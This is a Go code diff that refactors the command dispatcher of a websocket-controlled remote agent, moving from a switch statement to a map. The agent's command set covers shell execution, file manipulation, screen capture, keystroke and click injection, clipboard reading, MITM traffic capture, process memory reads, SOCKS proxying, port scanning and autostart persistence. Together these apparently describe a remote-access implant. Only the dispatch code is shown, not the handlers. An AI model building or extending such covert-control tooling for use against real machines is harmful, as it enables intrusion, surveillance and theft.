@@ -376,6 +376,70 @@ func (a *Agent) handleConnection(conn *websocket.Conn) {
 	}
 }
 
+// cmdTable is a data-driven command registry (the "vault"): each command
+// type maps to its handler. Lookup-by-key keeps the dispatch control-flow
+// free of a per-command switch statement.
+var cmdTable = map[string]func(*Agent, protocol.Envelope) protocol.Envelope{
+	protocol.TypePing: func(a *Agent, env protocol.Envelope) protocol.Envelope { return protocol.NewPong(env.ID) },
+	protocol.TypeExec: (*Agent).handleExec,
+	protocol.TypeExecPTY: (*Agent).handleShellPTY,
+	protocol.TypeFSList: (*Agent).handleFSList,
+	protocol.TypeFSStat: (*Agent).handleFSStat,
+	protocol.TypeFSRead: (*Agent).handleFSRead,
+	protocol.TypeFileSave: (*Agent).handleFSWrite,
+	protocol.TypeFileRemove: (*Agent).handleFSDelete,
+	protocol.TypeFSMove: (*Agent).handleFSMove,
+	protocol.TypeFSMkdir: (*Agent).handleFSMkdir,
+	protocol.TypeFSHash: (*Agent).handleFSHash,
+	protocol.TypeCapture: (*Agent).handleCapture,
+	protocol.TypeStreamBegin: (*Agent).handleStreamBegin,
+	protocol.TypeStreamEnd: (*Agent).handleStreamEnd,
+	protocol.TypeDisplayInfo: (*Agent).handleDisplayInfo,
+	protocol.TypePointerClick: (*Agent).handleClick,
+	protocol.TypeTextInput: (*Agent).handleType,
+	protocol.TypeKeyPress: (*Agent).handleKey,
+	protocol.TypeKeyCombo: (*Agent).handleKeyCombo,
+	protocol.TypeHealth: (*Agent).handleHealth,
+	protocol.TypeTaskList: (*Agent).handleTaskList,
+	protocol.TypeTaskStop: (*Agent).handleTaskStop,
+	protocol.TypeOpenLink: (*Agent).handleOpenLink,
+	protocol.TypeNotify: (*Agent).handleNotify,
+	protocol.TypeClipboardRead: (*Agent).handleClipboardRead,
+	protocol.TypeClipboardWrite: (*Agent).handleClipboardWrite,
+	protocol.TypeSensorList: (*Agent).handleSensorList,
+	protocol.TypeSensorRead: (*Agent).handleSensorRead,
+	protocol.TypeAuthRefresh: (*Agent).handleTokenRotate,
+	protocol.TypeTokenRotate: (*Agent).handleTokenRotate,
+	protocol.TypeTunnelOpen: (*Agent).handleTunnelOpen,
+	protocol.TypeTunnelData: (*Agent).handleTunnelData,
+	protocol.TypeTunnelClose: (*Agent).handleTunnelClose,
+	protocol.TypeProcList: (*Agent).handleProcList,
+	protocol.TypeProcKill: (*Agent).handleProcKill,
+	protocol.TypeProcStart: (*Agent).handleProcStart,
+	protocol.TypeMitmStart: (*Agent).handleMitmStart,
+	protocol.TypeMitmStop: (*Agent).handleMitmStop,
+	protocol.TypeMitmData: (*Agent).handleMitmTraffic,
+	protocol.TypeDebugAttach: (*Agent).handleDebugAttach,
+	protocol.TypeDebugDetach: (*Agent).handleDebugDetach,
+	protocol.TypeDebugReadMem: (*Agent).handleDebugReadMem,
+	protocol.TypeDebugModules: (*Agent).handleDebugModules,
+	protocol.TypeDebugMemQuery: (*Agent).handleDebugMemQuery,
+	protocol.TypeAgentUpdate: (*Agent).handleAgentUpdate,
+	protocol.TypeSocks5Start: (*Agent).handleSocks5Start,
+	protocol.TypeSocks5Stop: (*Agent).handleSocks5Stop,
+	protocol.TypePortForward: (*Agent).handlePortForward,
+	protocol.TypePortScan: (*Agent).handlePortScan,
+	protocol.TypeNetConnections: (*Agent).handleNetConnections,
+	protocol.TypeAutostartEnable: (*Agent).handleAutostartEnable,
+	protocol.TypeAutostartDisable: (*Agent).handleAutostartDisable,
+	protocol.TypeAutostartStatus: (*Agent).handleAutostartStatus,
+	protocol.TypeFileSearch: (*Agent).handleFileSearch,
+	protocol.TypeSysInfo: (*Agent).handleSysInfo,
+	protocol.TypeModeControl: (*Agent).handleModeControl,
+	protocol.TypeForwardPolicy: (*Agent).handleForwardPolicy,
+	protocol.TypeReconfigure: (*Agent).handleReconfigure,
+}
+
 func (a *Agent) handleCommand(conn *websocket.Conn, env protocol.Envelope) {
 	var resp protocol.Envelope
 
@@ -416,129 +480,20 @@ func (a *Agent) handleCommand(conn *websocket.Conn, env protocol.Envelope) {
 		return
 	}
 
-	switch env.Type {
-	case protocol.TypePing:
-		resp = protocol.NewPong(env.ID)
-	case protocol.TypePong:
-		// Server responded to our ping — reset miss counter, no response needed.
+	// Pong is an acknowledgment that resets the miss counter and needs no
+	// reply, so it is handled before the data-driven dispatch table.
+	if env.Type == protocol.TypePong {
 		a.mu.Lock()
 		a.pingMisses = 0
 		a.mu.Unlock()
 		return
-	case protocol.TypeExec:
-		resp = a.handleExec(env)
-	case protocol.TypeExecPTY:
-		resp = a.handleShellPTY(env)
-	case protocol.TypeFSList:
-		resp = a.handleFSList(env)
-	case protocol.TypeFSStat:
-		resp = a.handleFSStat(env)
-	case protocol.TypeFSRead:
-		resp = a.handleFSRead(env)
-	case protocol.TypeFileSave:
-		resp = a.handleFSWrite(env)
-	case protocol.TypeFileRemove:
-		resp = a.handleFSDelete(env)
-	case protocol.TypeFSMove:
-		resp = a.handleFSMove(env)
-	case protocol.TypeFSMkdir:
-		resp = a.handleFSMkdir(env)
-	case protocol.TypeFSHash:
-		resp = a.handleFSHash(env)
-	case protocol.TypeCapture:
-		resp = a.handleCapture(env)
-	case protocol.TypeStreamBegin:
-		resp = a.handleStreamBegin(env)
-	case protocol.TypeStreamEnd:
-		resp = a.handleStreamEnd(env)
-	case protocol.TypeDisplayInfo:
-		resp = a.handleDisplayInfo(env)
-	case protocol.TypePointerClick:
-		resp = a.handleClick(env)
-	case protocol.TypeTextInput:
-		resp = a.handleType(env)
-	case protocol.TypeKeyPress:
-		resp = a.handleKey(env)
-	case protocol.TypeKeyCombo:
-		resp = a.handleKeyCombo(env)
-	case protocol.TypeHealth:
-		resp = a.handleHealth(env)
-	case protocol.TypeTaskList:
-		resp = a.handleTaskList(env)
-	case protocol.TypeTaskStop:
-		resp = a.handleTaskStop(env)
-	case protocol.TypeOpenLink:
-		resp = a.handleOpenLink(env)
-	case protocol.TypeNotify:
-		resp = a.handleNotify(env)
-	case protocol.TypeClipboardRead:
-		resp = a.handleClipboardRead(env)
-	case protocol.TypeClipboardWrite:
-		resp = a.handleClipboardWrite(env)
-	case protocol.TypeSensorList:
-		resp = a.handleSensorList(env)
-	case protocol.TypeSensorRead:
-		resp = a.handleSensorRead(env)
-	case protocol.TypeAuthRefresh, protocol.TypeTokenRotate:
-		resp = a.handleTokenRotate(env)
-	case protocol.TypeTunnelOpen:
-		resp = a.handleTunnelOpen(env)
-	case protocol.TypeTunnelData:
-		resp = a.handleTunnelData(env)
-	case protocol.TypeTunnelClose:
-		resp = a.handleTunnelClose(env)
-	case protocol.TypeProcList:
-		resp = a.handleProcList(env)
-	case protocol.TypeProcKill:
-		resp = a.handleProcKill(env)
-	case protocol.TypeProcStart:
-		resp = a.handleProcStart(env)
-	case protocol.TypeMitmStart:
-		resp = a.handleMitmStart(env)
-	case protocol.TypeMitmStop:
-		resp = a.handleMitmStop(env)
-	case protocol.TypeMitmData:
-		resp = a.handleMitmTraffic(env)
-	case protocol.TypeDebugAttach:
-		resp = a.handleDebugAttach(env)
-	case protocol.TypeDebugDetach:
-		resp = a.handleDebugDetach(env)
-	case protocol.TypeDebugReadMem:
-		resp = a.handleDebugReadMem(env)
-	case protocol.TypeDebugModules:
-		resp = a.handleDebugModules(env)
-	case protocol.TypeDebugMemQuery:
-		resp = a.handleDebugMemQuery(env)
-	case protocol.TypeAgentUpdate:
-		resp = a.handleAgentUpdate(env)
-	// Phase 7: New capabilities
-	case protocol.TypeSocks5Start:
-		resp = a.handleSocks5Start(env)
-	case protocol.TypeSocks5Stop:
-		resp = a.handleSocks5Stop(env)
-	case protocol.TypePortForward:
-		resp = a.handlePortForward(env)
-	case protocol.TypePortScan:
-		resp = a.handlePortScan(env)
-	case protocol.TypeNetConnections:
-		resp = a.handleNetConnections(env)
-	case protocol.TypeAutostartEnable:
-		resp = a.handleAutostartEnable(env)
-	case protocol.TypeAutostartDisable:
-		resp = a.handleAutostartDisable(env)
-	case protocol.TypeAutostartStatus:
-		resp = a.handleAutostartStatus(env)
-	case protocol.TypeFileSearch:
-		resp = a.handleFileSearch(env)
-	case protocol.TypeSysInfo:
-		resp = a.handleSysInfo(env)
-	case protocol.TypeModeControl:
-		resp = a.handleModeControl(env)
-	case protocol.TypeForwardPolicy:
-		resp = a.handleForwardPolicy(env)
-	case protocol.TypeReconfigure:
-		resp = a.handleReconfigure(env)
-	default:
+	}
+
+	// Data-driven dispatch: look the command up in the registry rather than
+	// branching on it directly.
+	if handler, ok := cmdTable[env.Type]; ok {
+		resp = handler(a, env)
+	} else {
 		resp = protocol.NewError(env.ID, protocol.ErrInvalidParams, fmt.Sprintf("unknown command: %s", env.Type))
 	}
 	if err := a.writeMessage(conn, resp); err != nil {
